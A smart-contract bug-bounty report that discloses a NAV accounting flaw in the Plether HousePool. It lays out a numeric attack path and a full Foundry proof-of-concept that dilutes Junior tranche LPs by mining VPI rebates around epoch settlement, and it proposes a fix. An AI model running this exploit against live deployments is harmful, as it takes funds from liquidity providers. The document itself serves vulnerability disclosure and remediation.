# \#98117 [SC-Critical] Omission of Backed VPI Rebate Reserves from HousePool NAV Enables Risk Free Yield Extraction and Dilution of Incumbent LPs

**Submitted on Nov 5th 2026 at 07:53:05 UTC by @n0fr33w1f14u for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98117
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

# Summary
When a trader opens a skew reducing position, they receive a Virtual Price Impact (VPI) rebate paid directly from `HousePool` cash. Because lifetime VPI is backed by a nonwithdrawable clearinghouse reserve and enforced via a clamp upon closing, this payout represents a guaranteed receivable to the pool. However, `HousePool`'s Net Asset Value (NAV) accounting omits this locked receivable and only accounts for the immediate cash deduction. An attacker can exploit this temporary, artificial NAV drop by depositing into the Junior tranche at a discounted share price and closing their position to restore the NAV, extracting risk free profit at the direct expense of incumbent LPs.

# Details
When an open order reduces the protocol's directional skew, `OpenAccountingLib.buildOpenState` calculates a negative VPI trade cost. In `CfdEngineSettlementSidecar.executeOpen`, this negative trade cost is paid out from `HousePool` to `MarginClearinghouse`:

```solidity
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
```

Inside `HousePool.payOut`, canonical recognized assets are decremented immediately:

```solidity
function payOut(address recipient, uint256 amount) external {
    // ...
    accountedAssets -= amount;
    settlementToken.safeTransfer(recipient, amount);
}
```

To prevent traders from extracting unearned rebates, `MarginClearinghouse` locks an equivalent amount of the trader's collateral into `vpiRebateReserveBalances`:

```solidity
delta.vpiRebateReserveAfterAssets = _negativeVpiReserveTarget(effectiveSnap.position.vpiAccrued + openState.vpiAssets);
```

When the position is closed, `CloseAccountingLib.buildCloseState` enforces a strict lifetime clamp ensuring that accrued negative VPI is clawed back in full, regardless of subsequent pool depth changes:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

During close settlement, `CfdEngineSettlementSidecar.executeClose` seizes this locked reserve and transfers it back to `HousePool` as recognized revenue:

```solidity
if (delta.vpiRebateReserveConsumedAssets > 0) {
    clearinghouse.consumeVpiRebateReserve(delta.account, host.pool(), delta.vpiRebateReserveConsumedAssets);
}
// ...
IHousePool(host.pool()).recordClaimantInflow(
    cashArrivedRevenueAssets,
    IHousePool.ClaimantInflowKind.Revenue,
    IHousePool.ClaimantInflowCashMode.CashArrived
);
```

The core flaw is that `HousePool` NAV calculation (`CfdEngineProtocolLens.getHousePoolInputSnapshot` and `TerminalNavBookV2.terminalNavSnapshot`) derives pool assets purely from `pool.totalAssets()` (which decreased when the rebate was paid) and trader price PnL:

```solidity
ICfdEngineTypes.TerminalNavSnapshot memory terminalSnapshot = engineContract.terminalNavSnapshot();
uint256 poolAssets = engineContract.pool().totalAssets();
snapshot.physicalAssets = poolAssets;
snapshot.netPhysicalAssets = poolAssets;
snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
```

Neither `TerminalNavBookV2` nor `HousePool` tracks outstanding `vpiRebateReserveBalances` as a pool receivable. As a result, the pool's NAV and share price are artificially depressed for the entire duration the position remains open, despite the rebate being fully collateralized and guaranteed to return upon close or liquidation.

# Bug path numeric example
1. Initial State:
   - HousePool Junior Tranche has 100,000 USDG in assets and 100,000 issued shares.
   - Junior share price = 100,000 / 100,000 = 1.00 USDG per share.
   - The market has high directional skew (e.g., heavily Long).

2. Step 1: Queue Deposit (Epoch N)
   - Attacker queues an asynchronous deposit request of 90,000 USDG in `TrancheVault` for Epoch N before the 5 minute cutoff.

3. Step 2: Depress NAV
   - After the deposit cutoff but right before Epoch N settlement, the attacker executes a skew reducing Short order.
   - The order receives a 10,000 USDG VPI rebate paid out from `HousePool` to `MarginClearinghouse`.
   - `HousePool.accountedAssets` decreases from 100,000 USDG to 90,000 USDG.
   - `MarginClearinghouse` locks 10,000 USDG in the attacker's `vpiRebateReserveBalances`.

4. Step 3: Epoch N Settles
   - `HousePool.settleLpEpoch()` is executed.
   - Junior Tranche pricing assets = 90,000 USDG with 100,000 shares outstanding.
   - Depressed share price = 90,000 / 100,000 = 0.90 USDG per share.
   - Attacker's 90,000 USDG deposit mints: 90,000 / 0.90 = 100,000 shares.
   - Post-settlement: 180,000 USDG assets, 200,000 shares total.

5. Step 4: Queue Redemption (Epoch N+1)
   - Attacker queues a redemption request for their 100,000 shares in Epoch N+1.

6. Step 5: Restore NAV
   - Right before Epoch N+1 settlement, the attacker closes their Short position.
   - The VPI clamp forces the repayment of the 10,000 USDG rebate.
   - `MarginClearinghouse.consumeVpiRebateReserve()` transfers 10,000 USDG back to `HousePool` as Revenue.
   - `HousePool.accountedAssets` increases from 180,000 USDG to 190,000 USDG.

7. Step 6: Epoch N+1 Settles
   - `HousePool.settleLpEpoch()` is executed.
   - Restored share price = 190,000 / 200,000 = 0.95 USDG per share.
   - Attacker's 100,000 shares redeem for: 100,000 * 0.95 = 95,000 USDG.

8. Outcome:
   - Attacker profit: 95,000 - 90,000 = +5,000 USDG (minus trivial 0.04% trade execution fees).
   - Incumbent LPs' 100,000 shares are now worth 95,000 USDG instead of 100,000 USDG (a permanent loss of 5,000 USDG).

# Impact
This vulnerability directly causes theft of existing LP funds and permanent dilution of incumbent liquidity providers. An attacker can repeatedly extract value whenever market conditions permit skew reducing trades with positive VPI rebates.

The exploit requires:
- Existing market skew to generate a substantial VPI rebate that overcomes the protocol's 0.04% trade execution fees.
- Holding an open position across one epoch boundary (approximately 1 hour), which exposes the attacker to price risk unless they delta hedge the underlying on an external venue. Because delta hedging on liquid centralized exchanges is standard for MEV searchers and market makers, the operational barrier is low.

# Recommend Fix
Account for the aggregate active `vpiRebateReserveBalances` held across all accounts in `MarginClearinghouse` as a recognized asset/receivable in `HousePool`'s NAV and reconcile accounting.

1. Track aggregate outstanding VPI rebate reserves in `MarginClearinghouse`:
   Increment an aggregate counter `totalVpiRebateReserveAssets` whenever `lockVpiRebateReserve` or `reclassifyPnlPledgeToVpiRebateReserve` is called, and decrement it when released or consumed.

2. In `CfdEngineProtocolLens.getHousePoolInputSnapshot`, add the aggregate VPI rebate reserve to the pool's effective assets:
   ```solidity
   snapshot.physicalAssets = poolAssets + clearinghouse.totalVpiRebateReserveAssets();
   snapshot.netPhysicalAssets = snapshot.physicalAssets;
   ```
This ensures that paying out a VPI rebate does not artificially depress the pool's NAV, as the cash outflow is immediately offset by the recognized collateralized receivable.

## Proof of Concept

```bash
forge test --match-path test/poc/VpiRebateNavDilution.t.sol
```
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../packages/perps/test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// @notice End-to-end PoC for Junior dilution while a funded VPI rebate remains outstanding.
/// @dev Run only this file with the root Foundry configuration. The incumbent long creates a skew that the attacker
///      trades against. The attacker queues a Junior deposit, opens the rebate-bearing short, and lets the epoch price
///      shares before closing. The reserve is then returned to the pool and the attacker redeems the underpriced
///      shares.
contract VpiRebateNavDilutionPoC is BasePerpTest {

    address private constant INCUMBENT = address(0xA11CE);
    address private constant ATTACKER = address(0xB0B);
    address private constant SKEW_TRADER = address(0xCA401);

    uint256 private constant PRICE = 1e8;
    uint256 private constant SKEW_SIZE = 390_000e18;
    uint256 private constant ATTACKER_DEPOSIT = 9_000_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_Poc_BackfilledVpiReserveIsOmittedFromJuniorPricing() public {
        // Fund the incumbent Junior tranche so the attacker's deposit is priced against existing LP ownership.
        _fundJunior(INCUMBENT, 1_000_000e6);

        // Give both traders enough clearinghouse collateral to open their positions and cover the reserved amounts.
        _fundTrader(SKEW_TRADER, 100_000e6);
        _fundTrader(ATTACKER, 20_000e6);

        // Open a long that increases skew. Its positive VPI is collected into HousePool and creates the imbalance
        // that the attacker's short will reduce.
        _openViaRouter(SKEW_TRADER, CfdTypes.Side.LONG, SKEW_SIZE, 50_000e6, false);

        // Mint the attack capital and snapshot total wallet-plus-clearinghouse wealth before it is escrowed.
        settlementToken.mint(ATTACKER, ATTACKER_DEPOSIT);
        uint256 attackerWealthBefore = _wealth(ATTACKER);

        // Queue the Junior deposit before the rebate. The vault holds these assets outside HousePool NAV until epoch
        // settlement, so the later rebate can affect the share price used for this deposit.
        uint256 depositEpoch = _requestJuniorDeposit(ATTACKER, ATTACKER_DEPOSIT);

        // Record recognized pool cash after the first trade, then execute the skew-reducing short. Its negative VPI
        // pays cash out of HousePool while collateral is locked in the attacker's clearinghouse account.
        uint256 poolAssetsBeforeRebate = pool.totalAssets();
        _openViaRouter(ATTACKER, CfdTypes.Side.SHORT, SKEW_SIZE, 10_000e6, false);

        // Confirm the open position carries an exact, nonzero reserve for its negative lifetime VPI.
        (,,,,,, int256 accruedVpi) = engine.positions(ATTACKER);
        assertLt(accruedVpi, 0, "attacker position must receive a VPI rebate");
        uint256 backedVpiReserve = clearinghouse.vpiRebateReserveAssets(ATTACKER);
        assertEq(backedVpiReserve, uint256(-accruedVpi), "negative lifetime VPI must be fully collateralized");
        assertGt(backedVpiReserve, 0, "the rebate reserve must be material");
        assertLt(pool.totalAssets(), poolAssetsBeforeRebate, "rebate payout must lower recognized pool assets");

        // Advance to the deposit's maturity and refresh the oracle mark. HousePool requires a fresh mark while these
        // positions remain open.
        _warpToEpoch(depositEpoch);
        _refreshMarkForSettlement();

        // The pool's current Junior pricing state omits the collateralized clawback. Price a control deposit with the
        // reserve added as the missing receivable, then compare it with the shares actually minted from cash-only NAV.
        (, uint256 observedJuniorNav) = pool.getPendingDepositTrancheState();
        uint256 juniorSupply = juniorVault.totalSupply();
        uint256 sharesWithBackedReceivable = juniorVault.quoteDepositFromState(
            ATTACKER_DEPOSIT, observedJuniorNav + backedVpiReserve, juniorSupply, 0
        );

        // Settle at the observed cash-only NAV, then claim the shares minted at that price.
        IHousePool.LpEpochSettlementResult memory depositSettlement = _settleLpEpochForTest();
        assertEq(depositSettlement.juniorDepositAssets, ATTACKER_DEPOSIT);
        uint256 claimableAssets = juniorVault.claimableDepositRequest(depositEpoch, ATTACKER);
        assertEq(claimableAssets, ATTACKER_DEPOSIT, "the full queued deposit must settle");
        vm.prank(ATTACKER);
        uint256 attackerShares = juniorVault.claimDeposit(depositEpoch, claimableAssets, ATTACKER, ATTACKER);
        assertEq(attackerShares, depositSettlement.juniorDepositShares);
        assertGt(
            attackerShares,
            sharesWithBackedReceivable,
            "cash-only NAV must mint more shares than NAV including the backed clawback"
        );

        // Wait for the one-hour deposit cooldown and escrow the new shares for redemption. The shares now retain the
        // discounted entry price through the next settlement.
        uint256 unlockTime = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlockTime) vm.warp(unlockTime);
        vm.prank(ATTACKER);
        uint256 redeemEpoch = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        _warpToEpoch(redeemEpoch);

        // Close before the redemption epoch is priced. The lifetime clamp consumes the locked reserve and returns the
        // clawback to pool NAV, restoring the value omitted when the attacker entered.
        uint256 poolAssetsBeforeClose = pool.totalAssets();
        _closeViaRouter(ATTACKER, CfdTypes.Side.SHORT, SKEW_SIZE);
        assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER), 0, "full close must consume the VPI reserve");
        assertGt(pool.totalAssets(), poolAssetsBeforeClose, "closing must return the backed clawback to pool NAV");

        // Price and fund the queued redemption against the restored pool state, then claim the attacker's assets.
        _refreshMarkForSettlement();
        _settleLpEpochForTest();
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemEpoch, ATTACKER);
        assertEq(claimableShares, attackerShares, "the full attacker position must be redeemable");
        vm.prank(ATTACKER);
        uint256 redeemedAssets = juniorVault.claimRedeem(redeemEpoch, claimableShares, ATTACKER, ATTACKER);

        // Include the attacker's remaining clearinghouse collateral and wallet balance, net of fees and carry.
        uint256 attackerWealthAfter = _wealth(ATTACKER);
        assertGt(redeemedAssets, ATTACKER_DEPOSIT, "discounted entry shares must redeem above the deposit amount");
        assertGt(
            attackerWealthAfter,
            attackerWealthBefore,
            "share dilution profit must exceed the attacker's trading fees and carry"
        );
    }

    function _openViaRouter(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) private {
        // Use the committed order ID, then execute it from the FIFO queue with a fresh mock Pyth update.
        vm.prank(trader);
        uint64 orderId = router.commitOrder(side, size, margin, isClose ? 0 : PRICE, isClose);
        router.executeOrder(orderId, _mockPythUpdateData(PRICE));
    }

    function _closeViaRouter(
        address trader,
        CfdTypes.Side side,
        uint256 size
    ) private {
        _openViaRouter(trader, side, size, 0, true);
    }

    function _requestJuniorDeposit(
        address owner,
        uint256 assets
    ) private returns (uint256 requestId) {
        // Transfer the deposit into the vault's asynchronous request escrow.
        vm.startPrank(owner);
        settlementToken.approve(address(juniorVault), assets);
        requestId = juniorVault.requestDeposit(assets, owner, owner);
        vm.stopPrank();
    }

    function _warpToEpoch(
        uint256 epochId
    ) private {
        // Advance only when the requested epoch has not started yet.
        uint256 epochStart = pool.lpEpochStart(epochId);
        if (block.timestamp < epochStart) vm.warp(epochStart);
    }

    function _refreshMarkForSettlement() private {
        // Publish a current router-authorized mark so settlement can price live terminal PnL safely.
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.prank(address(router));
        engine.updateMarkPrice(PRICE, uint64(block.timestamp));
    }

    function _wealth(
        address account
    ) private view returns (uint256) {
        // Count both liquid USDG and the account's remaining clearinghouse balance in the net-profit comparison.
        return settlementToken.balanceOf(account) + clearinghouse.balanceAssets(account);
    }

}

```
